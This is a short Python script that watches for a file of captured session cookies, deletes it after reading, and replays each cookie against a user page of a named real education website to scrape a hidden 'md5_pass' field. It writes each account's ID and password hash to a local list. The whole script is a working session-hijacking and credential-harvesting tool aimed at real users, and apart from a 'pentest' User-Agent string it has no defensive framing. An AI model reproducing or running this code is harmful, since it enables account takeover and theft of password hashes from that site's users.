from bs4 import BeautifulSoup
from time import sleep
import subprocess
import requests


while True:
	
	
	#try to open file less_cookies.txt
	#extract the content to less_cookies
	#if doesn't exist, sleep for 20s
	try:
		with open ("less_cookies.txt","r") as f:
			less_cookies=f.read().encode('ascii', 'ignore').decode()
	except FileNotFoundError:
		print (".")
		sleep(20)
		continue
	
	
	#after extracting the data
	#delete the input file
	subprocess.call("rm less_cookies.txt",shell=True)
	
	
	
	#extracting every single piece of cookies in the data extracted
	#making the cookies into dict and store the cookies in a list
	cookiesdict_list=[]
	for cookies in less_cookies.split("\n")[:-1]:
		cookiesdict={}
		for element in cookies.split(","):
			if "=" in element:
				key=element.split("=")[0]
				values=element.split("=")[1]
				cookiesdict[key]=values
		cookiesdict_list.append(cookiesdict)
	
	
	
	#for every cookie in list, get the names and passwd
	#then output the names and passwd into a file
	for cookiesdict in cookiesdict_list:				
		try:
			names=cookiesdict["psid"]
		except KeyError:
			print ("no name")
			continue
		try:
			passwd=BeautifulSoup(requests.get("http://www.alevel.com.cn/user/s3333/",cookies=cookiesdict,headers={'User-Agent':'pentest'}).content,"html.parser").find("input",attrs={"id":"md5_pass"})["value"]
		except TypeError:
			print ("no passwd")
			continue

		#output the data
		print ("\n"+"===============output===============")
		print (names+","+passwd)
		print ("====================================")
		with open("namelist.txt","a") as f:
			f.write(names+","+passwd+"\n")